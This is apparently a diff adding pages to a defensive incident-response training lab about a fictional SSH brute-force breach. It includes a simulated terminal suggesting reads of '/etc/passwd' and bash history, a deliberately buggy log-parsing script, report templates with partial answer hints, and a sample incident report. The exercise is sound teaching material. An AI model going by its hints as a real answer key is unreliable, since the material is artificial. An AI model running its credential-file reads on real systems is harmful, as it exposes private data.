+            <button class="btn btn-gray" style="font-size:12px; padding:5px 10px;" onclick="clearSiemQuery()" title="Clear">&#10005;</button>
+          </div>
+        </div>
+        <textarea id="siem-input" style="width:100%; background:#010409; border:none; color:#c9d1d9; font-family:'Courier New',monospace; font-size:13px; padding:14px 16px; min-height:90px; outline:none; resize:vertical; border-bottom:1px solid #30363d;" placeholder="Write your SQL query here..." spellcheck="false">SELECT * FROM events LIMIT 20;</textarea>
+        <div id="siem-results" style="padding:12px 16px; min-height:48px; font-size:12px; overflow-x:auto; background:#010409;">
+          <span style="color:#a8b8d0;">Run a query to see results.</span>
+        </div>
+        <div style="background:#1c2128; padding:6px 16px; border-top:1px solid #30363d;">
+          <span id="siem-status-bar" style="color:#a8b8d0; font-size:11px;">Ready</span>
+        </div>
+      </div>
+
+      <!-- Hints -->
+      <div class="card" style="padding:14px;">
+        <h3 style="margin-bottom:8px;">Hints <span style="color:#a8b8d0; font-size:12px; font-weight:normal;">— reveal only if stuck</span></h3>
+        <div id="siem-hints" style="display:flex; flex-direction:column; gap:8px;"></div>
+        <button class="btn btn-gray" style="font-size:12px; margin-top:8px;" onclick="showHint('siem-hints', siemHints)">Show Next Hint</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notes -->
+  <div class="card" style="margin-top:4px;">
+    <h3>Investigation Notes — SIEM</h3>
+    <p class="field-label">What suspicious events did you find? Summarize your findings below.</p>
+    <textarea class="report-field" id="siem-notes" placeholder="e.g., Found 47 failed SSH login attempts from IP 185.220.101.42 between 01:52 and 02:14 AM on May 18..."></textarea>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
+    <button class="btn btn-gray" onclick="goTo(1)">&larr; Back</button>
+    <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
+    <button class="btn btn-primary" onclick="goTo(3)">Proceed to Terminal &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 3: TERMINAL ===================== -->
+<div class="page" id="page3">
+  <div class="card">
+    <h2>Phase 3 — Linux Server Investigation</h2>
+    <p>You have been given SSH access to ClearPath's primary Linux server (<code>clearpath-prod-01</code>, Ubuntu 22.04). The server was online during the incident. Investigate for attacker artifacts.</p>
+    <br>
+    <p style="color:#a8b8d0; font-size:13px;">Use the terminal below. Try commands like <code>whoami</code>, <code>cat /etc/passwd</code>, <code>crontab -l</code>, <code>ls /tmp</code>, <code>cat ~/.bash_history</code>, <code>last</code>, <code>ps aux</code>, <code>netstat -an</code>, and more. Not everything is malicious — you have to determine what is.</p>
+  </div>
+
+  <div class="card" style="padding:16px;">
+    <div style="display:flex; align-items:center; gap:8px; margin-bottom:10px;">
+      <div style="width:12px; height:12px; border-radius:50%; background:#3fb950;"></div>
+      <div style="width:12px; height:12px; border-radius:50%; background:#d29922;"></div>
+      <div style="width:12px; height:12px; border-radius:50%; background:#da3633;"></div>
+      <span style="color:#a8b8d0; font-size:12px; margin-left:8px;">clearpath-prod-01 &mdash; bash</span>
+    </div>
+    <div id="terminal-output" onclick="document.getElementById('terminal-input').focus()"></div>
+    <div id="terminal-input-row">
+      <span id="terminal-prompt-label">analyst@clearpath-prod-01:~$</span>
+      <input type="text" id="terminal-input" placeholder="" onkeydown="handleTerminal(event)" autocomplete="off" spellcheck="false">
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Hints <span style="color:#a8b8d0; font-size:12px; font-weight:normal;">— reveal only if stuck</span></h3>
+    <div id="terminal-hints" style="display:flex; flex-direction:column; gap:8px;"></div>
+    <button class="btn btn-gray" style="font-size:12px; margin-top:8px;" onclick="showHint('terminal-hints', termHints)">Show Next Hint</button>
+  </div>
+
+  <div class="card">
+    <h3>Investigation Notes — Terminal</h3>
+    <p class="field-label">What artifacts did you find on the system? What do they indicate?</p>
+    <textarea class="report-field" id="terminal-notes" placeholder="e.g., Found a suspicious cron job running every 5 minutes that beacons to 185.220.101.42. Also found a new user account 'svc_backup' created at 02:14 AM..."></textarea>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
+    <button class="btn btn-gray" onclick="goTo(2)">&larr; Back</button>
+    <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
+    <button class="btn btn-primary" onclick="goTo(4)">Proceed to Python Task &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 4: PYTHON ===================== -->
+<div class="page" id="page4">
+  <div class="card">
+    <h2>Phase 4 — Python Automation Task</h2>
+    <p>One of the key findings in this investigation is a <strong style="color:#f0f6fc;">brute force SSH attack</strong> that preceded the breach. A fellow analyst started writing a script to automatically detect this pattern in raw log files — but they left before finishing it, and it has bugs. Your job is to find and fix them so the script runs correctly.</p>
+    <br>
+    <p style="color:#a8b8d0; font-size:13px;">This is the kind of script a SOC team would use as an ongoing detective control — run it against any auth.log to surface brute force activity automatically.</p>
+  </div>
+
+  <div class="card">
+    <h3>Step 1 — Set Up Your Environment</h3>
+    <div class="alert alert-blue" style="font-size:13px;">Complete these steps before touching the code.</div>
+    <ol style="font-size:14px; line-height:2.2; margin-top:12px;">
+      <li>Verify Python is installed. Open a terminal (Command Prompt / PowerShell on Windows, Terminal on Mac) and run:
+        <div style="background:#010409; border:1px solid #30363d; border-radius:4px; padding:8px 12px; margin-top:4px; font-family:'Courier New',monospace; font-size:13px; color:#79c0ff;">python --version</div>
+        <p style="color:#a8b8d0; font-size:12px; margin-top:4px;">If that doesn't work, try <code>python3 --version</code>. You need version 3.6 or higher.</p>
+      </li>
+      <li>Create a folder on your desktop called <code>clearpath_investigation</code>.</li>
+      <li>Download <code>auth.log</code> using the button below and save it into that folder.</li>
+      <li>Create a new file in the same folder called <code>log_parser.py</code> and paste the buggy code into it.</li>
+    </ol>
+    <br>
+    <button class="btn btn-blue" onclick="downloadAuthLog()">Download auth.log</button>
+  </div>
+
+  <div class="card">
+    <h3>Step 2 — The Buggy Script</h3>
+    <p style="color:#a8b8d0; font-size:13px; margin-bottom:12px;">This script has <strong style="color:#ff7b72;">4 bugs</strong>. It will either crash, produce no output, or produce wrong output. Find and fix all of them.</p>
+    <pre style="background:#010409; border:1px solid #30363d; border-radius:6px; padding:14px; font-size:13px; color:#c9d1d9; overflow-x:auto; line-height:1.8;"><span style="color:#a8b8d0;"># log_parser.py — ClearPath SOC Analyst Tool</span>
+<span style="color:#a8b8d0;"># Find IPs with suspicious failed login activity</span>
+
+failed_attempts = {}
+
+<span style="color:#ff7b72;">with</span> <span style="color:#79c0ff;">open</span>(<span style="color:#a5d6ff;">'auth.log'</span>, <span style="color:#a5d6ff;">'r'</span>) <span style="color:#ff7b72;">as</span> f:
+    <span style="color:#ff7b72;">for</span> line <span style="color:#ff7b72;">in</span> f:
+        <span style="color:#ff7b72;">if</span> <span style="color:#a5d6ff;">'Accepted password'</span> <span style="color:#ff7b72;">in</span> line:  <span style="color:#a8b8d0;">                    # bug 1</span>
+            parts = line.split()
+            ip = parts[<span style="color:#79c0ff;">11</span>]  <span style="color:#a8b8d0;">                                    # bug 2</span>
+            <span style="color:#ff7b72;">if</span> ip <span style="color:#ff7b72;">in</span> failed_attempts:
+                failed_attempts[ip] += <span style="color:#79c0ff;">1</span>
+            <span style="color:#ff7b72;">else</span>:
+                failed_attempts[ip] = <span style="color:#79c0ff;">1</span>
+
+<span style="color:#ff7b72;">for</span> ip, count <span style="color:#ff7b72;">in</span> failed_attempts.items():
+    <span style="color:#ff7b72;">if</span> count <span style="color:#ff7b72;">&gt;</span> <span style="color:#79c0ff;">100</span>:  <span style="color:#a8b8d0;">                                        # bug 3</span>
+        <span style="color:#ff7b72;">print</span>(ip)  <span style="color:#a8b8d0;">                                          # bug 4</span></pre>
+
+    <div class="alert alert-yellow" style="font-size:13px; margin-top:12px;">
+      The comments mark where the bugs are — but not what the bug is or how to fix it. That's your job.
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>Step 3 — Run It</h3>
+    <p style="font-size:14px; line-height:2;">Once you think you've fixed all the bugs, open your terminal, navigate to your <code>clearpath_investigation</code> folder, and run:</p>
+    <div style="background:#010409; border:1px solid #30363d; border-radius:4px; padding:10px 14px; font-family:'Courier New',monospace; font-size:13px; color:#79c0ff; margin:10px 0;">python log_parser.py</div>
+    <p style="color:#a8b8d0; font-size:13px;">On Mac/Linux you may need to use <code>python3 log_parser.py</code>. To navigate to your folder use <code>cd ~/Desktop/clearpath_investigation</code>.</p>
+    <p style="color:#a8b8d0; font-size:13px; margin-top:8px;">If it runs with no output, a bug is still present. The correct output will show at least one flagged IP address and its count.</p>
+  </div>
+
+  <div class="card">
+    <h3>Hints <span style="color:#a8b8d0; font-size:12px; font-weight:normal;">— reveal only if stuck</span></h3>
+    <div id="python-hints" style="display:flex; flex-direction:column; gap:8px;"></div>
+    <button class="btn btn-gray" style="font-size:12px; margin-top:8px;" onclick="showHint('python-hints', pyHints)">Show Next Hint</button>
+  </div>
+
+  <div class="card">
+    <h3>Step 4 — Record Your Work</h3>
+    <p class="field-label">Paste the output of your fixed script here:</p>
+    <textarea class="report-field" id="python-output" placeholder="Paste your terminal output here..." style="min-height:80px; font-family:'Courier New',monospace;"></textarea>
+
+    <p class="field-label" style="margin-top:16px;">Describe each bug you found and how you fixed it:</p>
+    <textarea class="report-field" id="python-bugs" style="min-height:120px;" placeholder="Bug 1: The script was looking for 'Accepted password' instead of 'Failed password', so it was checking the wrong log lines...&#10;Bug 2: ...&#10;Bug 3: ...&#10;Bug 4: ..."></textarea>
+
+    <hr class="divider">
+    <h3>Reflection Questions</h3>
+    <p class="field-label">1. What IP address was flagged, and how many failed attempts did it make?</p>
+    <textarea class="report-field" id="python-q1" style="min-height:60px;"></textarea>
+
+    <p class="field-label">2. What type of attack does this pattern represent? What is the attacker trying to do?</p>
+    <textarea class="report-field" id="python-q2" style="min-height:80px;"></textarea>
+
+    <p class="field-label">3. What security control could have prevented or detected this attack earlier? Map it to a NIST CSF function (Identify, Protect, Detect, Respond, Recover).</p>
+    <textarea class="report-field" id="python-q3" style="min-height:80px;"></textarea>
+
+    <p class="field-label">4. How could this script be improved or extended for a real SOC environment?</p>
+    <textarea class="report-field" id="python-q4" style="min-height:80px;"></textarea>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
+    <button class="btn btn-gray" onclick="goTo(3)">&larr; Back</button>
+    <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
+    <button class="btn btn-primary" onclick="goTo(5)">Proceed to Playbook &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 5: PLAYBOOK ===================== -->
+<div class="page" id="page5">
+  <div class="card">
+    <h2>Phase 5 — Incident Response Playbook</h2>
+    <p>Using your investigation findings, complete the IR playbook below. This playbook follows the <strong style="color:#f0f6fc;">NIST Cybersecurity Framework (CSF)</strong> core functions and serves as the procedural record of your response to this incident.</p>
+  </div>
+
+  <div class="card">
+    <div class="report-section">
+      <h3>Incident Summary</h3>
+      <p class="field-label">Incident Name / Case ID</p>
+      <input class="report-field" id="pb-name" value="Operation: Silent Pivot — Case #2026-0518">
+      <p class="field-label">Date/Time of Detection</p>
+      <input class="report-field" id="pb-datetime" placeholder="e.g., May 18, 2026 at approximately 02:14 AM">
+      <p class="field-label">Analyst Name</p>
+      <input class="report-field" id="pb-analyst" placeholder="Your name">
+      <p class="field-label">Incident Classification</p>
+      <select class="report-field" id="pb-class">
+        <option value="">-- Select --</option>
+        <option>Unauthorized Access</option>
+        <option>Brute Force Attack</option>
+        <option>Data Exfiltration</option>
+        <option>Malware / Backdoor</option>
+        <option>Insider Threat</option>
+        <option>Multiple (describe below)</option>
+      </select>
+      <p class="field-label">Incident Severity</p>
+      <select class="report-field" id="pb-severity">
+        <option value="">-- Select --</option>
+        <option>Low</option>
+        <option>Medium</option>
+        <option>High</option>
+        <option>Critical</option>
+      </select>
+      <p class="field-label">Brief description of what happened (2-3 sentences)</p>
+      <textarea class="report-field" id="pb-desc"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>IDENTIFY — What assets were involved?</h3>
+      <p class="field-label">Which systems, accounts, or data were affected?</p>
+      <textarea class="report-field" id="pb-identify"></textarea>
+      <p class="field-label">What data is at risk? Is PHI involved?</p>
+      <textarea class="report-field" id="pb-phi" style="min-height:60px;"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>PROTECT — What controls failed or were missing?</h3>
+      <p class="field-label">List the protective controls that were absent or ineffective:</p>
+      <textarea class="report-field" id="pb-protect" placeholder="e.g., No MFA on SSH, weak password policy, no account lockout after failed attempts..."></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>DETECT — How was the incident detected? What was missed?</h3>
+      <p class="field-label">How was the incident initially detected?</p>
+      <textarea class="report-field" id="pb-detect-how" style="min-height:60px;"></textarea>
+      <p class="field-label">What did the SIEM miss or fail to alert on? Why does that matter?</p>
+      <textarea class="report-field" id="pb-detect-miss"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>RESPOND — What actions should be taken immediately?</h3>
+      <p class="field-label">List your immediate containment and response steps in order:</p>
+      <textarea class="report-field" id="pb-respond" placeholder="1. Isolate the server from the network&#10;2. Disable the svc_backup account&#10;3. Remove the malicious cron job&#10;4. ..."></textarea>
+      <p class="field-label">Who should be notified, and why? (include any legal/regulatory obligations)</p>
+      <textarea class="report-field" id="pb-notify"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>RECOVER — How does the organization return to normal operations?</h3>
+      <p class="field-label">What steps are needed to safely restore operations?</p>
+      <textarea class="report-field" id="pb-recover"></textarea>
+      <p class="field-label">What improvements should be made before restoring full access?</p>
+      <textarea class="report-field" id="pb-improve"></textarea>
+    </div>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
+    <button class="btn btn-gray" onclick="goTo(4)">&larr; Back</button>
+    <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
+    <button class="btn btn-primary" onclick="goTo(6)">Proceed to Final Report &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 6: FINAL REPORT ===================== -->
+<div class="page" id="page6">
+  <div class="card">
+    <h2>Phase 6 — Final Analyst Report</h2>
+    <p>This is your portfolio deliverable. Write a professional incident analysis report that you could present to a client or include in a job application. Use your findings from all previous phases.</p>
+    <br>
+    <p style="color:#a8b8d0; font-size:13px;">When complete, use your browser's Print function (<code>Ctrl+P</code> / <code>Cmd+P</code>) and select "Save as PDF" to export your report.</p>
+  </div>
+
+  <div class="card">
+    <div class="report-section">
+      <h3>Report Header</h3>
+      <p class="field-label">Analyst Name</p>
+      <input class="report-field" id="rpt-analyst" placeholder="Your Full Name">
+      <p class="field-label">Date of Report</p>
+      <input class="report-field" id="rpt-date" placeholder="e.g., May 24, 2026">
+      <p class="field-label">Client</p>
+      <input class="report-field" id="rpt-client" value="ClearPath Medical Billing, LLC">
+      <p class="field-label">Report Classification</p>
+      <input class="report-field" id="rpt-class" value="CONFIDENTIAL — For Client Use Only">
+    </div>
+
+    <div class="report-section">
+      <h3>1. Executive Summary</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Write a non-technical summary (3-5 sentences) that a business owner could understand. What happened, how bad is it, and what needs to happen next?</p>
+      <textarea class="report-field" id="rpt-exec" style="min-height:120px;"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>2. Attack Timeline</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Reconstruct the attacker's steps in chronological order based on your SIEM and terminal investigation.</p>
+      <textarea class="report-field" id="rpt-timeline" style="min-height:140px;" placeholder="[01:52 AM] First failed SSH login attempt from 185.220.101.42&#10;[02:14 AM] Successful SSH login — brute force succeeded&#10;[02:14 AM] Attacker created backdoor account 'svc_backup'&#10;[02:17 AM] ..."></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>3. Technical Findings</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Detail each finding. For each one, note: what you found, where you found it, and its significance.</p>
+
+      <p class="field-label">Finding 1 — Brute Force SSH Attack</p>
+      <textarea class="report-field" id="rpt-f1" style="min-height:80px;" placeholder="Describe the brute force evidence you found in the SIEM and/or Python task..."></textarea>
+
+      <p class="field-label">Finding 2 — Unauthorized Account Creation</p>
+      <textarea class="report-field" id="rpt-f2" style="min-height:80px;" placeholder="Describe the backdoor account you found and its implications..."></textarea>
+
+      <p class="field-label">Finding 3 — Persistence Mechanism (Cron Job)</p>
+      <textarea class="report-field" id="rpt-f3" style="min-height:80px;" placeholder="Describe the malicious cron job, what it does, and why it matters..."></textarea>
+
+      <p class="field-label">Finding 4 — Database Query Exfiltration Attempt</p>
+      <textarea class="report-field" id="rpt-f4" style="min-height:80px;" placeholder="Describe the suspicious database queries you found in the SIEM..."></textarea>
+
+      <p class="field-label">Finding 5 — Anti-Forensics (Deleted Bash History)</p>
+      <textarea class="report-field" id="rpt-f5" style="min-height:80px;" placeholder="Describe what you found (or didn't find) in bash history and what it suggests..."></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>4. NIST CSF Framework Mapping</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Map your findings to the five NIST CSF functions. Identify what failed and what was missing.</p>
+      <textarea class="report-field" id="rpt-nist" style="min-height:160px;" placeholder="IDENTIFY: ...&#10;&#10;PROTECT: ...&#10;&#10;DETECT: ...&#10;&#10;RESPOND: ...&#10;&#10;RECOVER: ..."></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>5. Control Gap Analysis</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Based on your interview with Jordan and your technical findings, list the security controls that were missing or failed. For each, state the risk it created.</p>
+      <textarea class="report-field" id="rpt-controls" style="min-height:160px;" placeholder="Control Gap 1: No multi-factor authentication on SSH&#10;Risk: Enabled brute force attack to succeed with only a password&#10;&#10;Control Gap 2: ..."></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>6. Recommendations</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">Provide prioritized, actionable recommendations. Separate immediate actions from long-term improvements.</p>
+      <p class="field-label">Immediate (within 24-48 hours)</p>
+      <textarea class="report-field" id="rpt-rec-imm" style="min-height:100px;"></textarea>
+      <p class="field-label">Short-term (within 30 days)</p>
+      <textarea class="report-field" id="rpt-rec-short" style="min-height:100px;"></textarea>
+      <p class="field-label">Long-term (strategic improvements)</p>
+      <textarea class="report-field" id="rpt-rec-long" style="min-height:100px;"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>7. Legal &amp; Ethical Considerations</h3>
+      <p style="color:#a8b8d0; font-size:12px; margin-bottom:8px;">This company handles PHI and is subject to HIPAA. Answer the following:</p>
+
+      <p class="field-label">Does this incident trigger HIPAA breach notification requirements? Why or why not?</p>
+      <textarea class="report-field" id="rpt-hipaa" style="min-height:80px;"></textarea>
+
+      <p class="field-label">What are the analyst's ethical obligations in this investigation?</p>
+      <textarea class="report-field" id="rpt-ethics" style="min-height:80px;"></textarea>
+
+      <p class="field-label">Were there any moments in this investigation where you faced an ethical decision? How did you reason through it?</p>
+      <textarea class="report-field" id="rpt-ethical-reasoning" style="min-height:80px;"></textarea>
+    </div>
+
+    <div class="report-section">
+      <h3>8. Appendix — Completed IR Playbook</h3>
+      <p style="color:#a8b8d0; font-size:13px;">Your IR Playbook from Phase 5 is automatically included as an appendix to this report. Ensure it is complete before exporting to PDF.</p>
+      <div class="alert alert-blue" style="margin-top:10px;">Your Phase 5 playbook entries will be referenced here in a complete submission. Review Phase 5 to ensure all fields are filled out.</div>
+    </div>
+
+    <div style="text-align:center; margin-top:20px; padding-top:20px; border-top:1px solid #30363d;">
+      <p style="color:#a8b8d0; font-size:13px; margin-bottom:14px;">When your report is complete, save it as a PDF using your browser's print function.</p>
+      <button class="btn btn-primary" style="font-size:14px; padding:10px 28px;" onclick="window.print()">Export to PDF (Print)</button>
+    </div>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; margin-top:10px;">
+    <button class="btn btn-gray" onclick="goTo(5)">&larr; Back to Playbook</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 7: NOTEBOOK ===================== -->
+<div class="page" id="page7">
+  <div class="card">
+    <h2>Analyst Notebook</h2>
+    <p>Use this space to take notes throughout your investigation. This page is for your eyes only — it is <strong style="color:#f0f6fc;">not graded</strong> and will not appear in your PDF report. Think of it as your scratch paper.</p>
+    <br>
+    <p style="color:#a8b8d0; font-size:13px;">All notes are autosaved with the rest of your work. You can come back here at any point during the investigation.</p>
+  </div>
+
+  <div class="card">
+    <h3>Free-form Notes</h3>
+    <p class="field-label">Anything goes — observations, questions, things to follow up on</p>
+    <textarea class="report-field" id="nb-freeform" style="min-height:200px;" placeholder="e.g. Something felt off about that contractor account Jordan mentioned — need to check if it still has active access..."></textarea>
+  </div>
+
+  <div class="card">
+    <h3>Suspicious Indicators</h3>
+    <p class="field-label">Log IOCs as you find them — IPs, usernames, file paths, timestamps</p>
+    <textarea class="report-field" id="nb-iocs" style="min-height:140px; font-family:'Courier New',monospace;" placeholder="IP: &#10;Username: &#10;File: &#10;Timestamp: &#10;Other: "></textarea>
+  </div>
+
+  <div class="card">
+    <h3>Attack Timeline (Scratch)</h3>
+    <p class="field-label">Rough timeline as you piece it together — refine this in your Final Report</p>
+    <textarea class="report-field" id="nb-timeline" style="min-height:160px; font-family:'Courier New',monospace;" placeholder="[??:??] &#10;[??:??] &#10;[??:??] &#10;[??:??] "></textarea>
+  </div>
+
+  <div class="card">
+    <h3>Questions & Follow-ups</h3>
+    <p class="field-label">Things you want to ask Jordan, verify in the SIEM, or check in the terminal</p>
+    <textarea class="report-field" id="nb-questions" style="min-height:140px;" placeholder="- Did Jordan ever follow up on whether the contractor's credentials were revoked?&#10;- Check if port 3306 is exposed externally&#10;- ..."></textarea>
+  </div>
+
+  <div class="card">
+    <h3>Control Gaps (Scratch)</h3>
+    <p class="field-label">Note security weaknesses as you discover them — use these in your report</p>
+    <textarea class="report-field" id="nb-controls" style="min-height:140px;" placeholder="- No MFA on SSH&#10;- "></textarea>
+  </div>
+</div>
+
+<!-- ===================== PAGE 8: RESOURCES ===================== -->
+<div class="page" id="page8">
+  <div class="card">
+    <h2>Resources &amp; Help</h2>
+    <p>Use this page if you get stuck. It won't tell you what to find — but it will help you understand what you're looking at and fix common technical problems.</p>
+  </div>
+
+  <!-- SAMPLE REPORT -->
+  <div class="card">
+    <h3>Sample Incident Report — Reference Only</h3>
+    <div class="alert alert-blue" style="margin-bottom:16px;">This is a <strong>fully written fictional example</strong> based on a completely different incident at a different company. Read it to understand what a finished, professional report looks like — the depth, the tone, and how each section connects. It has nothing to do with this exercise.</div>
+
+    <div style="background:#020810; border:1px solid var(--border2); border-radius:8px; padding:24px 28px; font-size:13px; line-height:1.9; color:var(--text);">
+
+      <p style="color:var(--text-bright); font-weight:bold; font-size:16px; margin-bottom:4px; letter-spacing:0.5px;">INCIDENT REPORT — INC-2026-0041</p>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:4px; font-size:12px; color:var(--text-dim); margin-bottom:24px; border-bottom:1px solid var(--border); padding-bottom:14px;">
+        <span><strong style="color:var(--text);">Analyst:</strong> Alex Chen, SOC II</span>
+        <span><strong style="color:var(--text);">Date:</strong> March 3, 2026</span>
+        <span><strong style="color:var(--text);">Client:</strong> Meridian Retail Group</span>
+        <span><strong style="color:var(--text);">Classification:</strong> Confidential — Internal Use Only</span>
+        <span><strong style="color:var(--text);">Incident Type:</strong> Business Email Compromise / Financial Fraud</span>
+        <span><strong style="color:var(--text);">Severity:</strong> High</span>
+      </div>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Executive Summary</p>
+      <p style="margin-bottom:12px;">On February 28, 2026, a targeted phishing campaign against Meridian Retail Group's accounts payable department resulted in the theft of an employee's Active Directory credentials and subsequent unauthorized access to the company's internal invoicing system. The attacker, operating from IP address 91.108.4.200, used the stolen credentials to authenticate to the corporate VPN and gain access to the invoicing platform, where they modified two vendor payment records to redirect a combined $42,000 to an external bank account under their control.</p>
+      <p style="margin-bottom:12px;">The breach went undetected for approximately 22 hours. Although a SIEM alert fired on the anomalous VPN login within minutes of the attacker's entry, it was not reviewed until the following morning — at which point the financial team had already flagged the discrepancy through routine reconciliation. The compromised account was disabled and the VPN session terminated by 9:45 AM on March 1, approximately 6 hours after detection.</p>
+      <p style="margin-bottom:20px;">A wire recall was initiated through Meridian's banking partner on March 1. As of the date of this report, $28,000 has been recovered. The remaining $14,000 is being pursued through the bank's fraud resolution process. No customer personal data, payment card data, or other regulated information was accessed during the incident. This report documents the full timeline, technical findings, control failures, and recommended remediation actions.</p>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Attack Timeline</p>
+      <div style="border-left:2px solid var(--border2); padding-left:16px; margin-bottom:20px;">
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Feb 28, 10:14 AM</span> — A phishing email purportedly from Meridian's IT helpdesk arrived in the inbox of J. Torres, an accounts payable specialist. The email claimed that Torres's account password was expiring and directed them to a spoofed login page hosted at <code>meridian-it-support[.]com</code> — a domain registered just four days earlier. Torres entered their Active Directory username and password on the spoofed page.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Feb 28, 10:31 AM</span> — Attacker authenticates to Meridian's corporate VPN from IP 91.108.4.200 (geolocation: Eastern Europe) using Torres's stolen credentials. A SIEM alert fires — "Off-hours VPN login from new geolocation" — but is queued for next-morning review with no real-time escalation configured.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Feb 28, 10:44 AM</span> — Attacker connects to the internal invoicing platform using Torres's account. Because Torres's account had read/write access to all vendor payment records (not just those in their own queue), the attacker has full access to the payment system.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Feb 28, 11:02 AM</span> — Attacker modifies two pending vendor payment records, changing the routing and account numbers on both to an attacker-controlled account. The changes are logged in the application audit trail but no alert fires on payment record modifications.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Feb 28, 11:09 AM</span> — Attacker logs out of VPN. Total dwell time on network: approximately 38 minutes.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Mar 1, 08:15 AM</span> — Finance team member R. Okafor flags two vendor payments during morning reconciliation: the routing numbers do not match those on file for either vendor. IT Security is notified immediately.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Mar 1, 08:22 AM</span> — Security team reviews the overnight SIEM queue and finds the anomalous VPN alert from the previous morning. Torres's account is immediately disabled and the incident is formally opened.</p>
+        <p style="margin-bottom:6px;"><span style="color:var(--yellow); font-size:12px;">Mar 1, 09:45 AM</span> — Incident declared contained. Banking partner notified; wire recall initiated for both payments. Payment records restored from application backup.</p>
+      </div>
+
+      <p style="color:var(--accent); font-weight:bold; margin-bottom:8px; font-size:14px;">Findings</p>
+
+      <p style="margin-bottom:4px;"><strong style="color:var(--text-bright);">Finding 1 — Credential Phishing via Spoofed Domain</strong></p>
+      <p style="margin-bottom:16px;">The attacker registered the domain <code>meridian-it-support[.]com</code> on February 24, 2026 — four days before the attack — and hosted a convincing replica of Meridian's internal IT portal. The phishing email was sent from this domain and passed basic spam filter checks because the domain had no prior reputation score and the sending infrastructure had not been previously flagged. The email used urgency language ("your password expires in 24 hours") to pressure the recipient into acting quickly without scrutinizing the URL. J. Torres, who had not received phishing awareness training since their onboarding in 2024, did not recognize the spoofed domain. This is the initial access vector for the entire incident.</p>
+
+      <p style="margin-bottom:4px;"><strong style="color:var(--text-bright);">Finding 2 — No Multi-Factor Authentication on VPN</strong></p>
+      <p style="margin-bottom:16px;">Meridian's corporate VPN required only a username and password for authentication. Once the attacker obtained Torres's credentials from the phishing page, there was no additional verification step to prevent access. Had MFA been enabled, the attacker would have been blocked at this stage even with valid credentials — a stolen password alone would have been insufficient. This is the most critical control failure in this incident. It converted a phishing success into full network access.</p>
+
+      <p style="margin-bottom:4px;"><strong style="color:var(--text-bright);">Finding 3 — Excessive Account Privileges (Principle of Least Privilege Violation)</strong></p>
+      <p style="margin-bottom:16px;">J. Torres's role in accounts payable required access to a specific subset of vendor payments assigned to their queue. However, their account was provisioned with read/write access to all vendor payment records in the invoicing system — including those managed by other team members and other departments. This over-provisioning meant that once the attacker had Torres's account, they could access and modify any payment record in the system, not just those Torres would legitimately touch. Had least-privilege principles been enforced, the blast radius of this incident would have been significantly smaller.</p>
+
+      <p style="margin-bottom:4px;"><strong style="color:var(--text-bright);">Finding 4 — SIEM Alert Not Actioned in Real Time</strong></p>
+      <p style="margin-bottom:16px;">The SIEM correctly flagged the attacker's VPN login at 10:31 AM on February 28 — within 17 minutes of the phishing email being clicked. The alert described "off-hours VPN login from new geolocation" and was accurate. However, the alert was placed in a review queue that the security team only checked the following morning. By the time it was reviewed, the attacker had been and gone. There was no escalation policy for this alert type, no on-call rotation for medium-severity alerts, and no automated response (such as triggering an additional authentication challenge or temporarily locking the session). This is a detection gap, not a tool gap — the SIEM did its job; the response process did not.</p>
+
